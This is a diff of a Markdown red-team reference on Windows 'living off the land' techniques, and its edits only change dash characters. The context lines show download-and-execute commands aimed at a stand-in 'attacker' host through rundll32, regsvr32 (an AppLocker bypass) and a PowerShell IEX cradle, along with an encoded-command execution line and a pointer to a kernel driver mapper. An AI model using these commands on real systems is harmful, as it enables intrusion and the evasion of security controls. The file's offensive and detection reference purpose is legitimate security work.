@@ -1,4 +1,4 @@
-# Living Off the Land — LOLBins, LOLBAs, LOLScripts
+# Living Off the Land - LOLBins, LOLBAs, LOLScripts
 
 > **Scope:** Using legitimate Windows binaries, libraries, and scripts for offensive operations. Includes enumeration, execution, download, lateral movement, and detection/hunting guidance.
 
@@ -27,13 +27,13 @@ Living Off the Land Binaries and Scripts (LOLBins/LOLBAs) are Microsoft-signed e
 
 **Why they're effective:**
 - Already present on every Windows system
-- Signed by Microsoft — trusted by most AV/allowlisting solutions
+- Signed by Microsoft - trusted by most AV/allowlisting solutions
 - Whitelisted in many environments
 - Blend into normal administrative activity
 
 **Resources:**
-- [LOLBAS Project](https://lolbas-project.github.io/) — comprehensive catalog
-- [GTFOBins](https://gtfobins.github.io/) — Linux equivalents
+- [LOLBAS Project](https://lolbas-project.github.io/) - comprehensive catalog
+- [GTFOBins](https://gtfobins.github.io/) - Linux equivalents
 
 ---
 
@@ -81,7 +81,7 @@ rundll32.exe url.dll,OpenURL http://attacker/payload.hta
 ### regsvr32.exe (Squiblydoo)
 
 ```cmd
-:: Execute remote scriptlet — bypasses AppLocker in script rules
+:: Execute remote scriptlet - bypasses AppLocker in script rules
 regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll
 
 :: Local execution
@@ -167,7 +167,7 @@ powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://
 powershell -EncodedCommand <base64_payload>
 
 # Constrained Language Mode bypass (various methods)
-# CLM prevents certain operations — test your target environment
+# CLM prevents certain operations - test your target environment
 ```
 
 ---
@@ -406,7 +406,7 @@ Get-ADGroupMember "Domain Admins"
 
 ## LOLDrivers
 
-Vulnerable signed drivers can be used to execute code in kernel mode (BYOVD — Bring Your Own Vulnerable Driver).
+Vulnerable signed drivers can be used to execute code in kernel mode (BYOVD - Bring Your Own Vulnerable Driver).
 
 **Common BYOVD Targets:**
 
@@ -425,7 +425,7 @@ Vulnerable signed drivers can be used to execute code in kernel mode (BYOVD — 
 
 **Resources:**
 - [LOLDrivers Project](https://www.loldrivers.io/)
-- [KDMapper](https://github.com/TheCruZ/kdmapper) — unsigned driver mapper using vulnerable driver
+- [KDMapper](https://github.com/TheCruZ/kdmapper) - unsigned driver mapper using vulnerable driver
 
 ---
 
